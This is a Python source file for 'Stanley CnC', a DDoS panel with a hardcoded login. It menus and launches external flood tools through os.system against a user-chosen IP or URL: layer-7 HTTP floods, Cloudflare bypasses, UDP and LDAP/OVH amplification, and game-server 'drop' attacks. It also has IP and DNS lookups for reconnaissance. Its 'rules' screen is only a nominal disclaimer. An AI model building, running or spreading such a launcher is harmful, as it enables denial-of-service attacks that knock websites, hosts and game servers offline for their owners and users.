import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
                  (\__.-. |
                  == ===_]+
                          |
 ` - .
       ` - >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                     (\__.-. |
                     == ===_]+
                             |
 ` - .
       ` - .
            >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                         (\__.-. |
                         == ===_]+
                                 |
 ` - .
       ` - .
            - 
              ` >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                              (\__.-. |
                              == ===_]+
                                      |
 ` - .
       ` - .
            - 
              `
                - >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                              (\__.-. |
                              == ===_]+
                                      |
 ` - .
       ` - .
            - 
              `
                - 
      ....       `   ....           ....           ....
     ||          >-> ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f"""
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m1337 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Stanley CnC! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mGithub: SkyWtkh-weird1337 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mNew Methods \x1b[38;2;0;255;255m+ \x1b[38;2;233;233;233mNew UI!')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m1. Do not attack without someone's permission \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m3. Do not spam attacks                        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Give a star to the github repository       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def layer7():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgoat-bypass         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcloudflare-uam    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-fuzz           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnormal-bypass     \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-dstat          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mautobypass          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps-bypass      \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m100up-bypass      \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-flood        \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-overflow       \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-get          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp-god             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mldap-vro          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome-god            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-fuck          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtelnet-god          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhaven-god           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def amp_games():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movhamp              \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mr6-drop           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mfivem-drop          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mvse               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mfortnite-fly        \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgame-crash        \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')


def menu():
    sys.stdout.write(f"\x1b]2;Stanley Net --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m1337 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Stanley CnC! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mGithub: weird1337 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mNew Methods \x1b[38;2;0;255;255m+ \x1b[38;2;233;233;233mNew UI!')
    print("")
    print("""
                       \x1b[38;2;0;212;14m.▄▄ ·\x1b[38;2;0;186;45m ▄▄▄▄▄ ▄▄▄·\x1b[38;2;0;150;88m  ▐ ▄ ▄▄\x1b[38;2;0;113;133m▌  ▄▄▄ .\x1b[38;2;0;83;168m ▄· ▄▌
                        \x1b[38;2;0;212;14m▐█ ▀.\x1b[38;2;0;186;45m •██  ▐█ ▀█\x1b[38;2;0;150;88m •█▌▐███\x1b[38;2;0;113;133m•  ▀▄.▀·\x1b[38;2;0;83;168m▐█▪██▌
                        \x1b[38;2;0;212;14m▄▀▀▀█\x1b[38;2;0;186;45m▄ ▐█.▪▄█▀▀█\x1b[38;2;0;150;88m ▐█▐▐▌██\x1b[38;2;0;113;133m▪  ▐▀▀▪▄\x1b[38;2;0;83;168m▐█▌▐█▪
                        \x1b[38;2;0;212;14m▐█▄▪▐\x1b[38;2;0;186;45m█ ▐█▌·▐█ ▪▐\x1b[38;2;0;150;88m▌██▐█▌▐█\x1b[38;2;0;113;133m▌▐▌▐█▄▄▌\x1b[38;2;0;83;168m▐█▀·.
                        \x1b[38;2;0;212;14m ▀▀▀▀\x1b[38;2;0;186;45m  ▀▀▀  ▀  ▀\x1b[38;2;0;150;88m ▀▀ █▪.▀\x1b[38;2;0;113;133m▀▀  ▀▀▀ \x1b[38;2;0;83;168m  ▀ • 
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║       \x1b[38;2;239;239;239mWelcome to Stanley Net DDoS Panel      \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - -   \x1b[38;2;239;239;239mThe best free panel on github  \x1b[38;2;0;212;14m- - - \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
                    \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
                    \x1b[38;2;0;212;14m║  \x1b[38;2;239;239;239mhttps://github.com/weird1337/stanley  \x1b[38;2;0;49;147m
                    \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239mType [help] to see the stanley commands.   \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
""")
def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[1337\x1b[38;2;0;186;45m@S\x1b[38;2;0;150;88mta\x1b[38;2;0;113;133mnl\x1b[38;2;0;83;168mey\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp/games" or cnc == "AMP/GAMES" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        
        elif "normal-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpbypassv2.js {url} {time}')
            except IndexError:
                print('Usage: normal-bypass <url> <time>')
                print('Example: normal-bypass http://example.com 20')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {threads}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example-cloud.com 20 15')

        elif "https-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node https.js {url} {time} proxies.txt')
            except IndexError:
                print('Usage: https-bypass <url> <time>')
                print('Example: https-bypass http://example.org 20')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                method = cnc.split()[3]
                os.system(f'node HTTP-RAW.js {url} {time} {method}')
            except IndexError:
                print('Usage: https-raw <url> <time> <GET/POST/HEAD>')
                print('Example: http-raw http://example.com 20 POST')

        elif "cloudflare-uam" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                cpt = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {cpt} proxies.txt ')
            except IndexError:
                print('Usage: cloudflare-uam <url> <time> <req_per_ip>')
                print('Example: cloudflare-uam http://example-uam.com 20 250')

        elif "http-overflow" in cnc:
            try:
                ip = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {time} {threads}')
            except IndexError:
                print('Usage: http-overflow <ip> <time> <threads>')
                print('Example: http-overflow 77.233.1XX.XX 30 15')

        elif "http-get" in cnc:
            try:
                url = cnc.split()[1]
                idk = cnc.split()[2]
                idk1 = cnc.split()[3]
                idk2 = cnc.split()[4]
                os.system(f'perl httpget {url} {idk} {idk1} {idk2}')
            except IndexError:
                print('Usage: http-get <url> <10000> <50> <100>')
                print('Example: http-get http://example.com 10000 50 100')

        elif "http-flood" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./httpflood {url} {threads} {method} {time} header.txt')
            except IndexError:
                print('Usage: http-flood <url> <threads> <get/post> <time>')
                print('Example: http-flood http://example.com 15 post 30')

        elif "100up-bypass" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                connections = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {connections}')
            except IndexError:
                print('Usage: 100up-bypass <GET/POST/HEAD> <ip> <port> <time> <connections')
                print('Example: 100up-bypass GET 77.233.1XX.XX 80 20 80000')

        elif "http-dstat" in cnc:
            try:
                url = cnc.split()[1]
                connections = cnc.split()[2]
                rps = cnc.split()[3]
                os.system(f'perl dstat.pl {url} {connections} {rps} 13.87')
            except IndexError:
                print('Usage: http-dstat <url> <connections> <rps>')
                print('Example: http-dstat http://example.org 50000 50000')

        elif "goat-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                os.system(f'node method.js {url} {time} request {rps}')
            except IndexError:
                print('Usage: goat-bypass <url> <time> <requests_per_second>')
                print('Example: goat-bypass http://example-protected-org 30 450')

        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "http-fuzz" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpfuzz.js {url} proxies.txt {time} POST')
            except IndexError:
                print(f'Usage: http-fuzz <url> <time>')
                print("Example: http-fuzz http://sexo.org 30")

        elif "autobypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'./AUTOBYPASS TCP {ip} {port} {time}')
            except IndexError:
                print('Usage: autobypass <ip> <port> <time>')
                print('Example: autobypass 188.40.1XX.XX 80 30')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print("Usage: http-rand <url> <time>")
                print("Example: http-rand http://si.com 10")

        elif 'ldap-vro' in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                pps = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./ldapv2 {ip} {port} ldaplist.txt {threads} {pps} {time}')
            except IndexError:
                print(f'Usage: ldap-vro <ip> <port> <threads> <pps> <time>')
                print(f'Example: ldap-vro 1.1.1.1 8739 15 1024 50')

        elif "ovhamp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'sudo ./OVH-AMP {ip} {port}')
            except IndexError:
                print(f'Usage: ovhamp <ip> <port>')
                print(f'Example: ovhamp 1.1.1.1 34264')

        elif "fivem-drop" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                pps = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./fivem {ip} {port} fivem.txt {threads} {pps} {time}')
            except IndexError:
                print('Usage: fivem-drop <ip> <port> <threads> <pps> <time>')
                print('Example: fivem-drop 1.1.1.1 30120 15 80000 30')

        elif "fortnite-fly" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                pps = cnc.split()[5]
                os.system(f'python3 FORTNITE-FLY.py {ip} {port} {threads} {time} {pps}')
            except IndexError:
                print('Usage: fornite-fly <ip> <port> <threads> <time> <pps>')
                print(f'Example: fortnite-fly 1.1.1.1 45 30 50 100000')

        elif "udp-god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                throttle = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./udp {ip} {port} {threads} {throttle} {time}')
            except IndexError:
                print(f'Usage: udp-god <ip> <port> <threads> <throttle> <time>')
                print(f'Example: udp-god 1.1.1.1 80 30 40000 30')

        elif "haven-god" in cnc:
            try:
                ip = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'sudo ./haven -d {ip} -t {time} -z 130')
            except IndexError:
                print('Usage: haven-god <ip> <time>')
                print('Example: haven-god 192.168.0.1 30')

        elif "telnet-god" in cnc:
            try:
                ip = cnc.split()[1]
                threads = cnc.split()[2]
                pps = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'sudo ./telnet {ip} {threads} {pps} {time}')
            except IndexError:
                print(f'Usage: telnet-god <ip> <threads> <pps> <time>')
                print('Example: telnet-god 192.168.0.1 30 80000 50')

        elif "home-god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print(f'Usage: home-god <ip> <port> <packet_size> <time>')
                print(f'Example: home-god 1.1.1.1 80 1024 50')

        elif "r6-drop" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                pps = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./R6-DROP {ip} {port} {threads} {pps} {time}')
            except IndexError:
                print('Usage: r6-drop <ip> <port> <threads> <pps> <time>')
                print('Example: r6-drop 1.1.1.1 8739 20 50000 30')

        elif "vse" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'sudo ./vse {ip} {port} {threads} {time}')
            except IndexError:
                print('Usage: vse <ip> <port> <threads> <time>')
                print('Example: vse 1.1.1.1 80 30 50')

        elif "ovh-fuck" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'sudo ./MertOVH {ip} {port}')
            except IndexError:
                print('Usage: game-crash <ip> <port>')
                print('Example: game-crash 192.168.0.1 22')

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩════════════════╗
             ╔══════════╩══════════╦══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  layer7             ║ L║  game               ║ L ║  tools              ║
             ║  layer4             ║  ║  rules              ║   ║  cls                ║
             ║  amp                ║  ║  ports              ║   ║  <empty>            ║
             ╚═════════════════════╩══╩═════════════════════╩═══╩═════════════════════╝

            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "1337"
    passwd = "1337"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("</> Invalid credentials! Abandoning...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("</> Welcome to Stanley CnC!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
